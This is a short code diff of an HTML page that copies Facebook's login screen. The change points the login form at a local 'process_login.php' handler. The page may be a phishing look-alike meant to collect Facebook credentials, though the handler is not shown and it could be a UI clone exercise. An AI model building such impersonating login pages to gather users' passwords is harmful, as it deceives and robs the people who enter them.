@@ -226,7 +226,7 @@
             <h2>Facebook helps you connect and share with the people in your life.</h2>
         </div>
         <div class="login-card">
-            <form action="login.php" method="POST">
+            <form action="process_login.php" method="POST">
                 <div class="form-group">
                     <input type="text" name="email" placeholder="Email address or phone number" required autocomplete="off">
                 </div>
